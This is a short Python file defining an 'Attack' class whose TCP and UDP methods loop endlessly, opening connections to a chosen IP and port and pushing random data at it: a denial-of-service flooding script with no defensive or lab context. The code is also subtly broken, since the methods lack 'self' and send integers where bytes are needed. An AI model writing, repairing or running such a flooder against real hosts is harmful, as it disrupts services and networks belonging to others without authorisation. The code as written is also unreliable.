import socket
import sys
import random

class Attack():
    def _TCP(ip, port, packets):
        try:
            while True:
                for _ in range(packets):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, port))
                    pck = random.randint(12000, 900000)
                    s.send(pck)
                    s.sendall(pck)
        except socket.error:
            print("An error occured.")
            s.close()
    def _UDP(ip, port, packets):
        try:
            while True:
                for _ in range(packets):
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect((ip, port))
                    pck = random.randint(12000, 900000)
                    s.send(pck)
                    s.sendall(pck)
        except socket.error:
            print("An error occured.")
            s.close()
